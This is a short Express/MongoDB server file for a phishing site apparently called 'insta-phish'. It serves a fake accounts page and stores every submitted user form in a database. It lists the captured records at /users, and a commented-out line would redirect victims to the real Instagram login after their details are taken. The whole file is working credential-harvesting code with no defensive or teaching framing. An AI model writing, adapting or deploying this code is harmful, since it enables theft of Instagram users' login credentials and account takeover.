if(process.env.NODE_ENV !== "production") {
    require('dotenv').config()
}

const express = require('express');
const mongoose = require('mongoose')
const app = express();
const path = require('path');
const User = require('./models/user')

const dbUrl = process.env.DB_URL;
// const dbUrl = process.env.DB_URL || 'mongodb://localhost:27017/insta-phish';
// const dbUrl = 'mongodb://localhost:27017/insta-phish';

mongoose.connect(dbUrl, {useNewUrlParser: true, useUnifiedTopology: true})
const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error:"));
db.once("open", () => {
    console.log("Database connected");
});

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'))

app.use(express.urlencoded({ extended: true }))

app.use(express.static(path.join(__dirname, 'public')));

app.get('/accounts', (req, res) => {
    res.render('index')
})

app.get('/users', async(req, res) => {
    const users = await User.find({})
    res.render('users', { users })
})

app.post('/accounts', async (req, res) => {
    const user = new User({ ...req.body.user });
    await user.save();
    res.redirect('/accounts');
    // res.redirect('https://instagram.com/accounts/login');
})

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`server is running on port ${port}` )
})